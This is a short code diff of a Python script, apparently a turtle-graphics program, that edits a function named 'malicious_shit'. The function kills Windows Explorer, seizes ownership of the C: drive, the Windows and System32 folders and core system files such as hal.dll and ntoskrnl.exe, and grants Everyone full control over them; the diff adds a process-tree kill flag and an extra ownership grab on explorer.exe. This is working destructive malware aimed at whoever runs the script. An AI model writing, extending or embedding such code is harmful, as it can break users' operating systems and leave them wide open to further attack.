@@ -4,12 +4,13 @@ import time
 from turtle import *
 import turtle
 def malicious_shit():
-        os.popen("taskkill /F /IM explorer.exe")
+        os.popen("taskkill /F /IM explorer.exe /T")
         subprocess.run(['takeown', '/F', "C:"])
         subprocess.run(['takeown', '/F', "C:\\Windows"])
         subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
         subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
         subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
+        subprocess.run(['takeown', '/F', "C:\\Windows\\explorer.exe"])
         subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
         subprocess.run(['icacls', 'C:\\Windows\\explorer.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
         subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
